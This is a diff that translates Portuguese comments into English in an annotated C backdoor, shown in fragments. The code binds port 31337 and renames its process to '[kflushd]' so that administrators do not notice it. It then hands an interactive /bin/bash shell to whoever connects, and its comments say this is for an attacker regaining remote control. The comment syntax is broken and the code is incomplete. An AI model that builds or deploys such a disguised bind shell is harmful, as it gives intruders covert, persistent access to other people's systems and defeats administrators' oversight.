@@ -9,24 +9,23 @@
 #include <sys/types.h>
 #include <signal.h>
 
---Primeira parte do programa, definiçao das bibliotecas necessarias.
+-- First step: define the libraries
 
 # 2 
 
-#define MINHA_PORTA 31337; --/define a porta.
-#define BACKLOG 5; --/numero maximo de conexoes
+#define MINHA_PORTA 31337; --/define the port
+#define BACKLOG 5; --/max number of connections
 
 # 3 
 
- struct sockaddr_in local; / Estrutura local
-  struct sockaddr_in remote; / Estrutura remota
+ struct sockaddr_in local; / local structure
+  struct sockaddr_in remote; / remote structure
 
 # 4 
 
 strcpy(argv[0], "[kflushd]");
  
---/realiza a copia de "kflushd" para argv[0]: kflushd basicamente é o nome de um serviço no kernel do linux, fazendo com que quando realizado a busca por programas ativos na memoria
- não será exibido um nome "estranho"
+--/Copy the "kflushd" value to "argv[0]. kflushd is a name for a linux service. We use this argument because when the admin check the process in memory, will not show a strange value or name
 
 # 5 
 
@@ -36,9 +35,8 @@ strcpy(argv[0], "[kflushd]");
             tamanho = sizeof(struct sockaddr_in);
 
 
---Define a porta a ser utilizada e o endereço da maquina host que inicializa o script.
---func. bind() e listen() sao responsaveis por ligar a porta ao programa e esperar por conxao e BACKLOG o numero de conexoes.
-
+--Define the port and the local address that will start the program
+--func. bind() and listen() links the port in the program, and BACKLOG is the maximum number of connections
 # 6 
 
  while(1)
@@ -61,18 +59,18 @@ strcpy(argv[0], "[kflushd]");
   
 } 
 
- --Aceita as conexoes e disponibiliza a shell para o invasor obter o controle remoto do sistema novamente.
+ --Accept conections and provides the shell for the attacker
 
 # 7 
 
     execl("/bin/bash","bash","-i", (char *)0);
     close(Novosocket);
     exit(0);
--- execuçao da shell para o atacante
+-- exec the shell
 
 
 # 8 
 
  local.sin_addr.s_addr = INADDR_ANY;  
-  --define o endereço local a ser usado.
+  --define the local addrs
 
